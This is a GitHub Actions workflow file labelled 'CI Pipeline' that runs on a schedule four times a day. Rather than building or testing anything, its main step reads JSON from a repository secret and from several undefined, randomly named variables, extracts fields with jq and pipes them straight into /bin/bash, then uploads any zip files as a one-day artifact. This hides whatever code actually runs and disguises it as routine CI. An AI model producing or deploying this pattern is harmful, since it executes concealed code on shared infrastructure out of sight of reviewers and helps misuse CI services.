name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '4 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  pipeline:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          jwgc5: ${{ secrets.jwgc5 }}
        run: |
          printf '%s' "$jwgc5" | jq -r .r3 | /bin/bash
          printf '%s' "$totu3422" | jq -r .mmr125 | /bin/bash
          echo $pcvg30 | jq -r .midtt08000 | /bin/bash
          echo $hrp67 | jq -r .rln33 | /bin/bash
          printf '%s' "$lpqhr0" | jq -r .lzlw20308 | /bin/bash

      - name: Persist output
        if: ${{ always() }}
        uses: actions/upload-artifact@v4
        with:
          name: MjoH7f38
          path: "*.zip"
          retention-days: 1
